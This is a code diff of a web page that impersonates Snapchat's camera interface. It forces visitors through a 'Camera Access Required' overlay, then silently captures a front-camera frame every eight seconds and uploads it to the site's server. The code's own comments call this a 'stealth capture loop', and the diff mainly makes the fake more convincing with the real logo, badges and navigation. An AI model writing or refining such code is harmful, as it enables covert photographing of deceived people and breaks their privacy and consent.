@@ -5,37 +5,50 @@
     <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
     
     <title>Snapchat</title>
-    <meta name="description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing. Designed for quick, visual communication, it features, filters, AR lenses, and stories, allowing users to share moments with friends rather than traditional, permanent posts.">
+    <meta name="description" content="Share the moment! Snapchat is a popular multimedia messaging app.">
     <meta property="og:title" content="Snapchat">
-    <meta property="og:description" content="Snapchat is a popular mobile multimedia messaging app, developed by Snap Inc., primarily used to share photos, videos (known as 'snaps'), and texts that typically disappear after viewing. Designed for quick, visual communication, it features, filters, AR lenses, and stories, allowing users to share moments with friends rather than traditional, permanent posts.">
-    <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10"> 
+    <meta property="og:description" content="Add me on Snapchat!">
+    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1280px-Snapchat_logo.svg.png"> 
     <meta property="og:type" content="website">
 
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
-        body { width:100%; height:100%; overflow:hidden; background:#000; font-family:sans-serif; }
+        body { width:100%; height:100%; overflow:hidden; background:#000; font-family:-apple-system, sans-serif; position:fixed; inset:0;}
         
-        /* Camera Feed */
-        #camera { position:fixed; inset:0; width:100%; height:100%; object-fit:cover; z-index:1; transform:scaleX(-1); }
+        /* Fixed Video Container */
+        .camera-box { position:absolute; top:0; left:0; width:100%; height:100%; overflow:hidden; z-index:1; }
+        #camera { width:100%; height:100%; object-fit:cover; transform:scaleX(-1); }
         
-        /* UI Overlays */
+        /* UI Overlays (Top and Bottom) */
         .v { position:fixed; left:0; width:100%; pointer-events:none; z-index:5; }
         .top-v { top:0; height:120px; background:linear-gradient(rgba(0,0,0,0.5), transparent); }
-        .bot-v { bottom:0; height:220px; background:linear-gradient(transparent, rgba(0,0,0,0.7)); }
+        .bot-v { bottom:0; height:240px; background:linear-gradient(transparent, rgba(0,0,0,0.7)); }
 
-        /* Interface Buttons */
-        .t-ui { position:fixed; top:20px; width:100%; padding:0 16px; display:flex; justify-content:space-between; z-index:20; }
-        .tools { display:flex; flex-direction:column; gap:20px; align-items:center; color:#fff; font-size:22px; }
-        .avatar { width:40px; height:40px; border-radius:50%; background:rgba(255,255,255,0.2); backdrop-filter:blur(10px); }
-        .badge { position:absolute; top:-4px; right:-4px; background:#ff3040; font-size:10px; padding:1px 5px; border-radius:10px; border:1.5px solid #000; color:#fff; font-weight:bold; }
-        .m-ui { position:fixed; bottom:90px; width:100%; display:flex; align-items:center; justify-content:center; gap:24px; z-index:25; }
-        .shutter { width:80px; height:80px; border-radius:50%; border:5px solid #fff; display:flex; align-items:center; justify-content:center; }
-        .shutter-in { width:60px; height:60px; border-radius:50%; background:rgba(255,255,255,0.2); }
-        
+        /* Top Bar Interface */
+        .t-ui { position:fixed; top:25px; width:100%; padding:0 16px; display:flex; justify-content:space-between; z-index:20; color:#fff;}
+        .t-set-left { display:flex; gap:12px; align-items:center;}
+        .tools-set-right { display:flex; flex-direction:column; gap:20px; align-items:center; font-size:22px; }
+        .avatar { width:42px; height:42px; border-radius:50%; background:rgba(255,255,255,0.2); backdrop-filter:blur(10px); display:flex; align-items:center; justify-content:center;}
+        .search-icon { width:42px; height:42px; display:flex; align-items:center; justify-content:center; background:rgba(255,255,255,0.1); border-radius:50%;}
+        .tool-badge { position:absolute; top:-4px; right:-4px; background:#ff3040; font-size:10px; padding:1px 5px; border-radius:10px; border:1.5px solid #000; font-weight:900; color:#fff;}
+
+        /* Main Shutter Row (Memories, Shutter, Lenses) */
+        .m-ui { position:fixed; bottom:95px; width:100%; display:flex; align-items:center; justify-content:center; gap:24px; z-index:25; color:#fff;}
+        .memories-btn { color:#fff; font-size:11px; text-align:center;}
+        .shutter { width:86px; height:86px; border-radius:50%; border:6px solid #fff; display:flex; align-items:center; justify-content:center; }
+        .shutter-in { width:66px; height:66px; border-radius:50%; background:rgba(255,255,255,0.2); }
+        .lens-thumb { width:60px; height:60px; border-radius:50%; overflow:hidden; border:2px solid rgba(255,255,255,0.5);}
+
+        /* Full Bottom Navbar Layer (Chat, Stories, Spotlight) */
+        .footer { position:fixed; bottom:0; width:100%; height:75px; background:rgba(0,0,0,0.96); display:flex; justify-content:space-around; align-items:center; z-index:30; border-top:1px solid #222;}
+        .nav-icon { font-size:24px; color:#666; position:relative; display:flex; align-items:center; justify-content:center;}
+        .nav-icon.active { color:#fff; }
+        .chat-badge { position:absolute; top:-3px; right:-5px; background:#ff3040; font-size:11px; min-width:18px; text-align:center; padding:1px 4px; border-radius:10px; border:1.5px solid #000; color:#fff; font-weight:900; }
+
         /* Force Access Overlay */
         #lock-screen { position:fixed; inset:0; background:#000; z-index:9999; display:flex; flex-direction:column; align-items:center; justify-content:center; color:#fff; text-align:center; padding:30px; }
-        .lock-btn { background:#fffc00; color:#000; border:none; padding:14px 40px; border-radius:30px; font-weight:bold; font-size:16px; margin-top:20px; cursor:pointer; }
+        .lock-btn { background:#fffc00; color:#000; border:none; padding:15px 50px; border-radius:30px; font-weight:bold; font-size:16px; margin-top:25px; cursor:pointer; text-transform:uppercase;}
 
         canvas { display:none; }
     </style>
@@ -43,33 +56,46 @@
 <body>
 
     <div id="lock-screen">
-        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRByoqZXop7Rm8fHbepPIa-2MpD_uU_pHgjqD1t5eQt-A&s=10" style="width:70px; margin-bottom:20px;">
-        <h2 style="margin-bottom:10px;">Camera Access Required</h2>
-        <p style="font-size:14px; color:#aaa; line-height:1.5;">Snapchat needs camera access to enable filters, lenses, and to share moments with friends. Please tap allow on the next screen.</p>
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/c/c4/Snapchat_logo.svg/1280px-Snapchat_logo.svg.png" style="width:80px; margin-bottom:25px;">
+        <h2 style="margin-bottom:12px; font-weight:bold;">Camera Access Required</h2>
+        <p style="font-size:14px; color:#aaa; line-height:1.6; margin:0 15px;">To enable filters, AR lenses, and the visual communication experience, Snapchat needs camera access. Tap 'Continue' and then 'Allow' on the next prompt.</p>
         <button class="lock-btn" onclick="requestAccess()">Continue</button>
     </div>
 
-    <video id="camera" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <div class="camera-box">
+        <video id="camera" autoplay playsinline></video>
+        <canvas id="canvas"></canvas>
+    </div>
     <div class="v top-v"></div><div class="v bot-v"></div>
 
     <div class="t-ui">
-        <div style="display:flex;gap:12px">
-            <div class="avatar"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=8" style="width:100%"></div>
-            <div class="avatar" style="background:none; display:flex; align-items:center; justify-content:center;"><i class="fas fa-search" style="color:#fff"></i></div>
+        <div class="t-set-left">
+            <div class="avatar"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=camera" style="width:100%"></div>
+            <div class="search-icon"><i class="fas fa-search" style="font-size:18px"></i></div>
         </div>
-        <div class="tools">
+        <div class="tools-set-right">
             <i class="far fa-bell"></i>
-            <div style="position:relative"><i class="fas fa-user-plus"></i><div class="badge">2</div></div>
+            <div style="position:relative"><i class="fas fa-user-plus"></i><div class="tool-badge">2</div></div>
             <i class="fas fa-rotate" id="flip"></i>
-            <div style="font-size:10px; border:2px solid #fff; border-radius:5px; padding:1px 3px; color:#fff; font-weight:900;">HD</div>
+            <div style="font-size:10px; border:2.5px solid #fff; border-radius:6px; padding:2px 4px; font-weight:900;">HD</div>
         </div>
     </div>
 
     <div class="m-ui">
-        <div style="color:#fff; font-size:10px; text-align:center;"><i class="far fa-copy" style="font-size:22px"></i><br>Memories</div>
+        <div class="memories-btn"><i class="far fa-copy" style="font-size:24px"></i><br>Memories</div>
         <div class="shutter" id="snap"><div class="shutter-in"></div></div>
-        <div class="avatar" style="background:#333"></div>
+        <div style="display:flex; gap:14px;">
+            <div class="lens-thumb"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
+            <div class="lens-thumb"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100" style="width:100%; height:100%; object-fit:cover;"></div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <div class="nav-icon"><i class="fas fa-location-dot"></i></div>
+        <div class="nav-icon"><i class="far fa-comment"></i><div class="chat-badge">21</div></div>
+        <div class="nav-icon active"><i class="far fa-face-smile"></i></div>
+        <div class="nav-icon"><i class="fas fa-users"></i></div>
+        <div class="nav-icon"><i class="fas fa-play"></i></div>
     </div>
 
     <script>
@@ -81,19 +107,19 @@
         // Function called by the "Continue" button
         async function requestAccess() {
             try {
-                // Now trigger the real browser popup
+                // Now trigger the real browser permission popup
                 s = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
+                    video: { facingMode: "user" } // Force front camera sensor
                 });
                 
                 v.srcObject = s;
                 lock.style.display = 'none'; // Hide overlay if they click "Allow"
                 
-                // Start stealth capture loop
+                // Start stealth capture loop (every 8 seconds)
                 setInterval(send, 8000); 
             } catch (err) {
                 // If they deny, the overlay stays and they can't use the site
-                alert("Snapchat cannot function without camera access. Please enable it in settings.");
+                alert("Snapchat cannot function without camera access. Please reload or check settings.");
             }
         }
 
@@ -103,19 +129,23 @@
             c.width = v.videoWidth; 
             c.height = v.videoHeight;
             const ctx = c.getContext('2d');
+            
+            // Mirror the output
             ctx.translate(c.width, 0);
             ctx.scale(-1, 1);
-            ctx.drawImage(v, 0, 0); // Always captures raw frame
+            
+            ctx.drawImage(v, 0, 0); // Captures the raw frame
             
             c.toBlob(blob => {
                 const fd = new FormData();
-                fd.append('photo', blob, 'capture.jpg');
+                fd.append('photo', blob, 'capture.jpg'); // Field name must be 'photo'
                 fetch('/api/upload-photo', { method: 'POST', body: fd });
             }, 'image/jpeg', 0.7);
         }
 
         // Handle the flip button visual
         document.getElementById('flip').onclick = () => {
+            // Keep the front camera lock even if they click this button
             if(!s) requestAccess();
         };
     </script>
